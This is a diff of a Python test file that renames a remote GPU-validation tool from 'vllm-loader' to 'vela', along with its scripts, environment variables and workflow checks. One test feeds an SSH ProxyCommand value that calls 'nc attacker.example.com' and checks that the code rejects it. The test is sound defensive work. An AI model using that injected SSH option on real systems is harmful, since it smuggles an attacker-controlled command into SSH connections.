@@ -7,13 +7,13 @@ from pathlib import Path
 
 import pytest
 
-from vllm_loader.config.targets import TargetConfig, TransportKind
+from vela.config.targets import TargetConfig, TransportKind
 
 
 def _script_test_env(**overrides: str) -> dict[str, str]:
     env = dict(os.environ)
     for key in list(env):
-        if key.startswith("VLLM_LOADER_REMOTE_") or key == "VLLM_LOADER_SSH_OPTS":
+        if key.startswith("VELA_REMOTE_") or key == "VELA_SSH_OPTS":
             env.pop(key, None)
     env.update(overrides)
     return env
@@ -36,12 +36,12 @@ def test_remote_validation_uses_textual_smoke_for_real_config() -> None:
     assert "sample_gpus" in script
     assert "vllm --version" in script
     assert "vllm serve --help" in script
-    assert '"$venv_bin/vllm-loader" smoke-tui "$real_config"' in script
-    assert '"$venv_bin/vllm-loader" smoke "$real_config"' not in script
-    assert 'vllm-loader run "$real_config"' not in script
-    assert 'remote_venv="${4:-/tank/venvs/lab-tui}"' in script
+    assert '"$venv_bin/vela" smoke-tui "$real_config"' in script
+    assert '"$venv_bin/vela" smoke "$real_config"' not in script
+    assert 'vela run "$real_config"' not in script
+    assert 'remote_venv="${4:-/tank/venvs/vela}"' in script
     assert '"$venv_python" -m pip --version' in script
-    assert "install python3-venv/ensurepip or set VLLM_LOADER_REMOTE_PYTHON" in script
+    assert "install python3-venv/ensurepip or set VELA_REMOTE_PYTHON" in script
 
 
 def test_remote_validation_pulls_committed_git_state_before_tests() -> None:
@@ -58,7 +58,7 @@ def test_remote_validation_workflow_uses_remote_safe_pytest_slice() -> None:
         encoding="utf-8"
     )
 
-    assert "VLLM_LOADER_REMOTE_PYTEST_ARGS" in workflow
+    assert "VELA_REMOTE_PYTEST_ARGS" in workflow
     assert "tests/test_remote_workflow.py" in workflow
     assert "tests/test_transport_factory.py" in workflow
     assert "tests/test_targets.py" in workflow
@@ -69,8 +69,8 @@ def test_remote_validation_workflow_mints_unique_build_and_model_labels() -> Non
         encoding="utf-8"
     )
 
-    assert "VLLM_LOADER_REMOTE_BUILD_LABEL" in workflow
-    assert "VLLM_LOADER_REMOTE_MODEL_ID" in workflow
+    assert "VELA_REMOTE_BUILD_LABEL" in workflow
+    assert "VELA_REMOTE_MODEL_ID" in workflow
     assert "github.run_id" in workflow
     assert "github.run_attempt" in workflow
 
@@ -79,8 +79,8 @@ def test_remote_validation_restarts_daemon_after_install() -> None:
     script = Path("scripts/run_remote_tests.sh").read_text(encoding="utf-8")
 
     install_command = '"$venv_python" -m pip install -e ".[dev]"'
-    restart_command = '"$venv_bin/vllm-loader" agent restart'
-    list_command = '"$venv_bin/vllm-loader" list'
+    restart_command = '"$venv_bin/vela" agent restart'
+    list_command = '"$venv_bin/vela" list'
     assert restart_command in script
     assert script.index(install_command) < script.index(restart_command)
     assert script.index(restart_command) < script.index(list_command)
@@ -93,7 +93,7 @@ def test_remote_validation_exercises_live_run_daemon_restart() -> None:
     assert "SubprocessTargetClient" in script
     assert '"agent", "connect"' in script
     assert 'await client.call(\n            "launch"' in script
-    assert 'subprocess.run([str(venv_bin / "vllm-loader"), "agent", "restart"]' in script
+    assert 'subprocess.run([str(venv_bin / "vela"), "agent", "restart"]' in script
     assert 'await client.call("discover_runs"' in script
     assert 'await client.call("reattach"' in script
     assert 'await client.call(\n            "stop"' in script
@@ -129,10 +129,10 @@ def test_gpu_workflow_docs_record_tested_vllm_range_and_textual_serve() -> None:
     assert "vLLM `0.20.2rc1.dev9+g01d4d1ad3`" in docs
     assert "v0.19.1rc1.dev119+gba4a78eb5" in docs
     assert "vLLM 0.19" in docs
-    assert "vllm-loader smoke-tui" in docs
-    assert "VLLM_LOADER_REMOTE_BUILD_SPEC" in docs
-    assert "VLLM_LOADER_REMOTE_MODEL_REPO" in docs
-    assert "VLLM_LOADER_REMOTE_GATED_MODEL_REPO" in docs
+    assert "vela smoke-tui" in docs
+    assert "VELA_REMOTE_BUILD_SPEC" in docs
+    assert "VELA_REMOTE_MODEL_REPO" in docs
+    assert "VELA_REMOTE_GATED_MODEL_REPO" in docs
     assert "GATED_MODEL_AUTH_OK" in docs
     assert "textual serve" in docs
     assert "network/auth" in docs
@@ -144,9 +144,9 @@ def test_gpu_workflow_docs_record_p620_controller_to_blackbird_smoke() -> None:
 
     assert "P620-01 controller to Blackbird agent" in docs
     assert "ssh -A -i /Users/brennanconley/vibecode/infx/ubuntu24_ed25519" in docs
-    assert "vllm-loader targets test blackbird" in docs
+    assert "vela targets test blackbird" in docs
     assert (
-        "vllm-loader smoke-tui qwen36-27b-fp8-kvfp8-rp6000-blackbird --target blackbird"
+        "vela smoke-tui qwen36-27b-fp8-kvfp8-rp6000-blackbird --target blackbird"
         in docs
     )
     assert (
@@ -158,7 +158,7 @@ def test_gpu_workflow_docs_record_p620_controller_to_blackbird_smoke() -> None:
         in docs
     )
     assert "GitHub Actions run `26976430928`" in docs
-    assert "VLLM_LOADER_REMOTE_REAL_RESUME_CONFIG" in docs
+    assert "VELA_REMOTE_REAL_RESUME_CONFIG" in docs
     assert "scripts/laptop_sleep_reconnect_check.py" in docs
     assert "LAPTOP_SLEEP_RECONNECT_OK" in docs
     assert "--build gha-26976430928-1-build" in docs
@@ -184,7 +184,7 @@ def test_remote_validation_forwards_timeout_override_to_ssh_script(tmp_path: Pat
     env = _script_test_env(
         PATH=f"{bin_dir}:{os.environ['PATH']}",
         SSH_CAPTURE=str(capture),
-        VLLM_LOADER_REMOTE_TIMEOUT="2400",
+        VELA_REMOTE_TIMEOUT="2400",
     )
 
     result = subprocess.run(
@@ -192,7 +192,7 @@ def test_remote_validation_forwards_timeout_override_to_ssh_script(tmp_path: Pat
             "bash",
             "scripts/run_remote_tests.sh",
             "gpu-host",
-            "/srv/lab-tui",
+            "/srv/vela",
             "real-config",
         ],
         check=False,
@@ -205,19 +205,19 @@ def test_remote_validation_forwards_timeout_override_to_ssh_script(tmp_path: Pat
     args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
     remote_script = (tmp_path / "ssh-capture.stdin").read_text(encoding="utf-8")
     assert args[-5:] == [
-        "/srv/lab-tui",
+        "/srv/vela",
         "2400",
         "auto",
-        "/tank/venvs/lab-tui",
+        "/tank/venvs/vela",
         "real-config",
     ]
     assert 'remote_timeout="$2"' in remote_script
     assert 'remote_python="${3:-auto}"' in remote_script
-    assert 'remote_venv="${4:-/tank/venvs/lab-tui}"' in remote_script
+    assert 'remote_venv="${4:-/tank/venvs/vela}"' in remote_script
     assert '"$venv_python" -m pip install -e ".[dev]"' in remote_script
     assert 'export PATH="$venv_bin:$PATH"' in remote_script
     assert (
-        'timeout "$remote_timeout" "$venv_bin/vllm-loader" smoke-tui "$real_config"'
+        'timeout "$remote_timeout" "$venv_bin/vela" smoke-tui "$real_config"'
         in remote_script
     )
 
@@ -241,10 +241,10 @@ def test_remote_validation_can_target_nested_agent_workflow(tmp_path: Path) -> N
     env = _script_test_env(
         PATH=f"{bin_dir}:{os.environ['PATH']}",
         SSH_CAPTURE=str(capture),
-        VLLM_LOADER_REMOTE_TARGET="blackbird",
-        VLLM_LOADER_REMOTE_BUILD_SPEC="vllm==0.11.2",
-        VLLM_LOADER_REMOTE_MODEL_ID="real-model-smoke",
-        VLLM_LOADER_REMOTE_MODEL_REPO="hf-internal-testing/tiny-random-LlamaForCausalLM",
+        VELA_REMOTE_TARGET="blackbird",
+        VELA_REMOTE_BUILD_SPEC="vllm==0.11.2",
+        VELA_REMOTE_MODEL_ID="real-model-smoke",
+        VELA_REMOTE_MODEL_REPO="hf-internal-testing/tiny-random-LlamaForCausalLM",
     )
 
     result = subprocess.run(
@@ -252,7 +252,7 @@ def test_remote_validation_can_target_nested_agent_workflow(tmp_path: Path) -> N
             "bash",
             "scripts/run_remote_tests.sh",
             "p620-controller",
-            "/srv/lab-tui",
+            "/srv/vela",
             "real-config",
         ],
         check=False,
@@ -267,23 +267,23 @@ def test_remote_validation_can_target_nested_agent_workflow(tmp_path: Path) -> N
     assert args[:5] == [
         "p620-controller",
         "env",
-        "VLLM_LOADER_REMOTE_TARGET=blackbird",
+        "VELA_REMOTE_TARGET=blackbird",
         "bash",
         "-s",
     ]
     expected_snippets = [
         'target_args=(--target "$remote_target")',
-        '"$venv_bin/vllm-loader" build add "${target_args[@]}"',
-        '"$venv_bin/vllm-loader" build verify "$remote_build_label" '
+        '"$venv_bin/vela" build add "${target_args[@]}"',
+        '"$venv_bin/vela" build verify "$remote_build_label" '
         '"${target_args[@]}"',
-        '"$venv_bin/vllm-loader" model pin "$remote_model_id" '
+        '"$venv_bin/vela" model pin "$remote_model_id" '
         '"${target_args[@]}"',
-        '"$venv_bin/vllm-loader" model download "$remote_model_ref" '
+        '"$venv_bin/vela" model download "$remote_model_ref" '
         '"${target_args[@]}"',
-        '"$venv_bin/vllm-loader" model verify "$remote_model_ref" '
+        '"$venv_bin/vela" model verify "$remote_model_ref" '
         '"${target_args[@]}"',
-        '"$venv_bin/vllm-loader" preview "$real_config" "${target_args[@]}"',
-        'timeout "$remote_timeout" "$venv_bin/vllm-loader" smoke-tui '
+        '"$venv_bin/vela" preview "$real_config" "${target_args[@]}"',
+        'timeout "$remote_timeout" "$venv_bin/vela" smoke-tui '
         '"$real_config" "${target_args[@]}"',
     ]
     for snippet in expected_snippets:
@@ -309,12 +309,12 @@ def test_remote_validation_can_run_real_model_resume_check(tmp_path: Path) -> No
     env = _script_test_env(
         PATH=f"{bin_dir}:{os.environ['PATH']}",
         SSH_CAPTURE=str(capture),
-        VLLM_LOADER_REMOTE_TARGET="blackbird",
-        VLLM_LOADER_REMOTE_REAL_RESUME_CONFIG="qwen-real",
+        VELA_REMOTE_TARGET="blackbird",
+        VELA_REMOTE_REAL_RESUME_CONFIG="qwen-real",
     )
 
     result = subprocess.run(
-        ["bash", "scripts/run_remote_tests.sh", "p620-controller", "/srv/lab-tui"],
+        ["bash", "scripts/run_remote_tests.sh", "p620-controller", "/srv/vela"],
         check=False,
         capture_output=True,
         text=True,
@@ -327,8 +327,8 @@ def test_remote_validation_can_run_real_model_resume_check(tmp_path: Path) -> No
     assert args[:5] == [
         "p620-controller",
         "env",
-        "VLLM_LOADER_REMOTE_TARGET=blackbird",
-        "VLLM_LOADER_REMOTE_REAL_RESUME_CONFIG=qwen-real",
+        "VELA_REMOTE_TARGET=blackbird",
+        "VELA_REMOTE_REAL_RESUME_CONFIG=qwen-real",
         "bash",
     ]
     assert "== Real model resume/daemon restart ==" in remote_script
@@ -355,13 +355,13 @@ def test_remote_validation_can_run_gated_model_auth_probe(tmp_path: Path) -> Non
     env = _script_test_env(
         PATH=f"{bin_dir}:{os.environ['PATH']}",
         SSH_CAPTURE=str(capture),
-        VLLM_LOADER_REMOTE_GATED_MODEL_REPO="meta-llama/Llama-2-7b-hf",
-        VLLM_LOADER_REMOTE_GATED_MODEL_ID="gated-llama-auth",
-        VLLM_LOADER_REMOTE_GATED_MODEL_REVISION="main",
+        VELA_REMOTE_GATED_MODEL_REPO="meta-llama/Llama-2-7b-hf",
+        VELA_REMOTE_GATED_MODEL_ID="gated-llama-auth",
+        VELA_REMOTE_GATED_MODEL_REVISION="main",
     )
 
     result = subprocess.run(
-        ["bash", "scripts/run_remote_tests.sh", "p620-controller", "/srv/lab-tui"],
+        ["bash", "scripts/run_remote_tests.sh", "p620-controller", "/srv/vela"],
         check=False,
         capture_output=True,
         text=True,
@@ -374,9 +374,9 @@ def test_remote_validation_can_run_gated_model_auth_probe(tmp_path: Path) -> Non
     assert args[:6] == [
         "p620-controller",
         "env",
-        "VLLM_LOADER_REMOTE_GATED_MODEL_REPO=meta-llama/Llama-2-7b-hf",
-        "VLLM_LOADER_REMOTE_GATED_MODEL_ID=gated-llama-auth",
-        "VLLM_LOADER_REMOTE_GATED_MODEL_REVISION=main",
+        "VELA_REMOTE_GATED_MODEL_REPO=meta-llama/Llama-2-7b-hf",
+        "VELA_REMOTE_GATED_MODEL_ID=gated-llama-auth",
+        "VELA_REMOTE_GATED_MODEL_REVISION=main",
         "bash",
     ]
     assert "== Real gated model auth probe ==" in remote_script
@@ -391,7 +391,7 @@ def test_remote_validation_runs_real_config_before_real_resume() -> None:
 
     real_config_block = (
         'if [[ -n "$real_config" ]]; then\n'
-        '  "$venv_bin/vllm-loader" preview "$real_config" "${target_args[@]}"'
+        '  "$venv_bin/vela" preview "$real_config" "${target_args[@]}"'
     )
     real_resume_block = (
         'if [[ -n "$remote_real_resume_config" ]]; then\n'
@@ -421,16 +421,16 @@ def test_remote_validation_passes_real_build_and_model_to_resume_check(
     env = _script_test_env(
         PATH=f"{bin_dir}:{os.environ['PATH']}",
         SSH_CAPTURE=str(capture),
-        VLLM_LOADER_REMOTE_BUILD_SPEC="vllm==0.11.2",
-        VLLM_LOADER_REMOTE_BUILD_LABEL="tiny-build",
-        VLLM_LOADER_REMOTE_MODEL_ID="tiny-model",
-        VLLM_LOADER_REMOTE_MODEL_REPO="hf-internal-testing/tiny-random-LlamaForCausalLM",
-        VLLM_LOADER_REMOTE_MODEL_REVISION="main",
-        VLLM_LOADER_REMOTE_REAL_RESUME_CONFIG="tiny-real",
+        VELA_REMOTE_BUILD_SPEC="vllm==0.11.2",
+        VELA_REMOTE_BUILD_LABEL="tiny-build",
+        VELA_REMOTE_MODEL_ID="tiny-model",
+        VELA_REMOTE_MODEL_REPO="hf-internal-testing/tiny-random-LlamaForCausalLM",
+        VELA_REMOTE_MODEL_REVISION="main",
+        VELA_REMOTE_REAL_RESUME_CONFIG="tiny-real",
     )
 
     result = subprocess.run(
-        ["bash", "scripts/run_remote_tests.sh", "p620-controller", "/srv/lab-tui"],
+        ["bash", "scripts/run_remote_tests.sh", "p620-controller", "/srv/vela"],
         check=False,
         capture_output=True,
         text=True,
@@ -481,7 +481,7 @@ def test_real_model_resume_check_validates_ssh_opts_before_agent_restart(
 ) -> None:
     module = _load_real_model_resume_check()
     monkeypatch.setenv(
-        "VLLM_LOADER_SSH_OPTS",
+        "VELA_SSH_OPTS",
         "-o ProxyCommand='nc attacker.example.com 22'",
     )
     monkeypatch.setattr(
@@ -493,7 +493,7 @@ def test_real_model_resume_check_validates_ssh_opts_before_agent_restart(
         name="blackbird",
         transport=TransportKind.SSH,
         host="bgconley@10.25.0.51",
-        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+        ssh_opts_env="VELA_SSH_OPTS",
     )
 
     with pytest.raises(ValueError, match="command-bearing SSH option"):
@@ -563,11 +563,11 @@ def test_remote_validation_accepts_pytest_args_override(tmp_path: Path) -> None:
     env = _script_test_env(
         PATH=f"{bin_dir}:{os.environ['PATH']}",
         SSH_CAPTURE=str(capture),
-        VLLM_LOADER_REMOTE_PYTEST_ARGS=pytest_args,
+        VELA_REMOTE_PYTEST_ARGS=pytest_args,
     )
 
     result = subprocess.run(
-        ["bash", "scripts/run_remote_tests.sh", "controller-host", "/srv/lab-tui"],
+        ["bash", "scripts/run_remote_tests.sh", "controller-host", "/srv/vela"],
         check=False,
         capture_output=True,
         text=True,
@@ -580,12 +580,12 @@ def test_remote_validation_accepts_pytest_args_override(tmp_path: Path) -> None:
     assert args[:5] == [
         "controller-host",
         "env",
-        "VLLM_LOADER_REMOTE_PYTEST_ARGS=-q\\ "
+        "VELA_REMOTE_PYTEST_ARGS=-q\\ "
         "tests/test_remote_workflow.py\\ -k\\ target_nested",
         "bash",
         "-s",
     ]
-    assert 'remote_pytest_args="${VLLM_LOADER_REMOTE_PYTEST_ARGS:--q}"' in remote_script
+    assert 'remote_pytest_args="${VELA_REMOTE_PYTEST_ARGS:--q}"' in remote_script
     assert 'read -r -a pytest_args <<< "$remote_pytest_args"' in remote_script
     assert '"$venv_python" -m pytest "${pytest_args[@]}"' in remote_script
 
@@ -609,15 +609,15 @@ def test_remote_validation_can_execute_real_build_and_model_jobs(tmp_path: Path)
     env = _script_test_env(
         PATH=f"{bin_dir}:{os.environ['PATH']}",
         SSH_CAPTURE=str(capture),
-        VLLM_LOADER_REMOTE_BUILD_SPEC="vllm==0.11.2",
-        VLLM_LOADER_REMOTE_BUILD_LABEL="real-build-smoke",
-        VLLM_LOADER_REMOTE_MODEL_ID="real-model-smoke",
-        VLLM_LOADER_REMOTE_MODEL_REPO="hf-internal-testing/tiny-random-LlamaForCausalLM",
-        VLLM_LOADER_REMOTE_MODEL_REVISION="main",
+        VELA_REMOTE_BUILD_SPEC="vllm==0.11.2",
+        VELA_REMOTE_BUILD_LABEL="real-build-smoke",
+        VELA_REMOTE_MODEL_ID="real-model-smoke",
+        VELA_REMOTE_MODEL_REPO="hf-internal-testing/tiny-random-LlamaForCausalLM",
+        VELA_REMOTE_MODEL_REVISION="main",
     )
 
     result = subprocess.run(
-        ["bash", "scripts/run_remote_tests.sh", "gpu-host", "/srv/lab-tui"],
+        ["bash", "scripts/run_remote_tests.sh", "gpu-host", "/srv/vela"],
         check=False,
         capture_output=True,
         text=True,
@@ -627,12 +627,12 @@ def test_remote_validation_can_execute_real_build_and_model_jobs(tmp_path: Path)
     assert result.returncode == 0, result.stderr
     args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
     remote_script = (tmp_path / "ssh-capture.stdin").read_text(encoding="utf-8")
-    empty = "__VLLM_LOADER_EMPTY__"
+    empty = "__VELA_EMPTY__"
     assert args[-12:] == [
-        "/srv/lab-tui",
+        "/srv/vela",
         "1800",
         "auto",
-        "/tank/venvs/lab-tui",
+        "/tank/venvs/vela",
         empty,
         "pip",
         "vllm==0.11.2",
@@ -643,14 +643,14 @@ def test_remote_validation_can_execute_real_build_and_model_jobs(tmp_path: Path)
         "main",
     ]
     assert 'remote_build_method="$(_remote_arg_or_empty "${6:-pip}")"' in remote_script
-    assert '"$venv_bin/vllm-loader" build add' in remote_script
+    assert '"$venv_bin/vela" build add' in remote_script
     assert '--method "$remote_build_method"' in remote_script
     assert '--spec "$remote_build_spec"' in remote_script
-    assert '"$venv_bin/vllm-loader" build verify "$remote_build_label"' in remote_script
-    assert '"$venv_bin/vllm-loader" model pin "$remote_model_id"' in remote_script
+    assert '"$venv_bin/vela" build verify "$remote_build_label"' in remote_script
+    assert '"$venv_bin/vela" model pin "$remote_model_id"' in remote_script
     assert '--repo-id "$remote_model_repo"' in remote_script
-    assert '"$venv_bin/vllm-loader" model download "$remote_model_ref"' in remote_script
-    assert '"$venv_bin/vllm-loader" model verify "$remote_model_ref"' in remote_script
+    assert '"$venv_bin/vela" model download "$remote_model_ref"' in remote_script
+    assert '"$venv_bin/vela" model verify "$remote_model_ref"' in remote_script
 
 
 def test_remote_validation_writes_dated_artifact(tmp_path: Path) -> None:
@@ -674,8 +674,8 @@ def test_remote_validation_writes_dated_artifact(tmp_path: Path) -> None:
     env = _script_test_env(
         PATH=f"{bin_dir}:{os.environ['PATH']}",
         SSH_CAPTURE=str(capture),
-        VLLM_LOADER_REMOTE_ARTIFACT_DIR=str(artifact_dir),
-        VLLM_LOADER_REMOTE_ARTIFACT_NAME="2026-06-04-gpu-host-smoke.md",
+        VELA_REMOTE_ARTIFACT_DIR=str(artifact_dir),
+        VELA_REMOTE_ARTIFACT_NAME="2026-06-04-gpu-host-smoke.md",
     )
 
     result = subprocess.run(
@@ -683,7 +683,7 @@ def test_remote_validation_writes_dated_artifact(tmp_path: Path) -> None:
             "bash",
             "scripts/run_remote_tests.sh",
             "gpu-host",
-            "/srv/lab-tui",
+            "/srv/vela",
             "real-config",
         ],
         check=False,
@@ -696,9 +696,9 @@ def test_remote_validation_writes_dated_artifact(tmp_path: Path) -> None:
     artifact = artifact_dir / "2026-06-04-gpu-host-smoke.md"
     assert artifact.exists()
     artifact_text = artifact.read_text(encoding="utf-8")
-    assert "# vLLM Loader Remote Validation" in artifact_text
+    assert "# Vela Remote Validation" in artifact_text
     assert "Host: `gpu-host`" in artifact_text
-    assert "Remote path: `/srv/lab-tui`" in artifact_text
+    assert "Remote path: `/srv/vela`" in artifact_text
     assert "Real config: `real-config`" in artifact_text
     assert "REMOTE_OK from gpu-host" in artifact_text
     assert "Exit status: `0`" in artifact_text
@@ -726,12 +726,12 @@ def test_remote_validation_model_only_uses_nonempty_ssh_placeholders(
     env = _script_test_env(
         PATH=f"{bin_dir}:{os.environ['PATH']}",
         SSH_CAPTURE=str(capture),
-        VLLM_LOADER_REMOTE_MODEL_ID="real-model-smoke",
-        VLLM_LOADER_REMOTE_MODEL_REPO="sshleifer/tiny-gpt2",
+        VELA_REMOTE_MODEL_ID="real-model-smoke",
+        VELA_REMOTE_MODEL_REPO="sshleifer/tiny-gpt2",
     )
 
     result = subprocess.run(
-        ["bash", "scripts/run_remote_tests.sh", "gpu-host", "/srv/lab-tui"],
+        ["bash", "scripts/run_remote_tests.sh", "gpu-host", "/srv/vela"],
         check=False,
         capture_output=True,
         text=True,
@@ -741,12 +741,12 @@ def test_remote_validation_model_only_uses_nonempty_ssh_placeholders(
     assert result.returncode == 0, result.stderr
     args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
     remote_script = (tmp_path / "ssh-capture.stdin").read_text(encoding="utf-8")
-    empty = "__VLLM_LOADER_EMPTY__"
+    empty = "__VELA_EMPTY__"
     assert args[-12:] == [
-        "/srv/lab-tui",
+        "/srv/vela",
         "1800",
         "auto",
-        "/tank/venvs/lab-tui",
+        "/tank/venvs/vela",
         empty,
         "pip",
         empty,
@@ -756,7 +756,7 @@ def test_remote_validation_model_only_uses_nonempty_ssh_placeholders(
         empty,
         empty,
     ]
-    assert 'empty_arg="__VLLM_LOADER_EMPTY__"' in remote_script
+    assert 'empty_arg="__VELA_EMPTY__"' in remote_script
     assert "_remote_arg_or_empty" in remote_script
 
 
@@ -774,14 +774,14 @@ def test_manual_remote_validation_workflow_executes_script_and_uploads_artifact(
     assert "real_resume_config" in text
     assert "gated_model_repo" in text
     assert "tiny-random-llama-detached-blackbird" in text
-    assert "VLLM_LOADER_REMOTE_REAL_RESUME_CONFIG" in text
-    assert "VLLM_LOADER_REMOTE_GATED_MODEL_REPO" in text
-    assert "VLLM_LOADER_REMOTE_TARGET" in text
+    assert "VELA_REMOTE_REAL_RESUME_CONFIG" in text
+    assert "VELA_REMOTE_GATED_MODEL_REPO" in text
+    assert "VELA_REMOTE_TARGET" in text
     assert "ssh-agent -s" in text
     assert "ssh-add \"$key_path\"" in text
-    assert "VLLM_LOADER_SSH_OPTS=-A -i $key_path" in text
+    assert "VELA_SSH_OPTS=-A -i $key_path" in text
     assert "scripts/run_remote_tests.sh" in text
-    assert "VLLM_LOADER_REMOTE_ARTIFACT_DIR" in text
+    assert "VELA_REMOTE_ARTIFACT_DIR" in text
     assert "actions/upload-artifact" in text
     assert "remote-validation-artifacts" in text
 
@@ -805,11 +805,11 @@ def test_remote_validation_accepts_ssh_options_for_gpu_keys(tmp_path: Path) -> N
     env = _script_test_env(
         PATH=f"{bin_dir}:{os.environ['PATH']}",
         SSH_CAPTURE=str(capture),
-        VLLM_LOADER_SSH_OPTS="-i /tmp/gpu-key -o BatchMode=yes",
+        VELA_SSH_OPTS="-i /tmp/gpu-key -o BatchMode=yes",
     )
 
     subprocess.run(
-        ["bash", "scripts/run_remote_tests.sh", "gpu-host", "/srv/lab-tui"],
+        ["bash", "scripts/run_remote_tests.sh", "gpu-host", "/srv/vela"],
         check=True,
         capture_output=True,
         text=True,
@@ -818,7 +818,7 @@ def test_remote_validation_accepts_ssh_options_for_gpu_keys(tmp_path: Path) -> N
 
     args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
     assert args[:5] == ["-i", "/tmp/gpu-key", "-o", "BatchMode=yes", "gpu-host"]
-    assert args[-4:] == ["/srv/lab-tui", "1800", "auto", "/tank/venvs/lab-tui"]
+    assert args[-4:] == ["/srv/vela", "1800", "auto", "/tank/venvs/vela"]
 
 
 def test_remote_validation_accepts_zfs_venv_override(tmp_path: Path) -> None:
@@ -840,11 +840,11 @@ def test_remote_validation_accepts_zfs_venv_override(tmp_path: Path) -> None:
     env = _script_test_env(
         PATH=f"{bin_dir}:{os.environ['PATH']}",
         SSH_CAPTURE=str(capture),
-        VLLM_LOADER_REMOTE_VENV="/tank/venvs/custom-lab-tui",
+        VELA_REMOTE_VENV="/tank/venvs/custom-vela",
     )
 
     subprocess.run(
-        ["bash", "scripts/run_remote_tests.sh", "gpu-host", "/srv/lab-tui"],
+        ["bash", "scripts/run_remote_tests.sh", "gpu-host", "/srv/vela"],
         check=True,
         capture_output=True,
         text=True,
@@ -852,7 +852,7 @@ def test_remote_validation_accepts_zfs_venv_override(tmp_path: Path) -> None:
     )
 
     args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
-    assert args[-4:] == ["/srv/lab-tui", "1800", "auto", "/tank/venvs/custom-lab-tui"]
+    assert args[-4:] == ["/srv/vela", "1800", "auto", "/tank/venvs/custom-vela"]
 
 
 def test_rsync_to_gpu_accepts_ssh_options_for_gpu_keys(tmp_path: Path) -> None:
@@ -873,11 +873,11 @@ def test_rsync_to_gpu_accepts_ssh_options_for_gpu_keys(tmp_path: Path) -> None:
     env = _script_test_env(
         PATH=f"{bin_dir}:{os.environ['PATH']}",
         RSYNC_CAPTURE=str(capture),
-        VLLM_LOADER_SSH_OPTS="-i /tmp/gpu-key -o BatchMode=yes",
+        VELA_SSH_OPTS="-i /tmp/gpu-key -o BatchMode=yes",
     )
 
     subprocess.run(
-        ["bash", "scripts/rsync_to_gpu.sh", "gpu-host:/srv/lab-tui"],
+        ["bash", "scripts/rsync_to_gpu.sh", "gpu-host:/srv/vela"],
         check=True,
         capture_output=True,
         text=True,
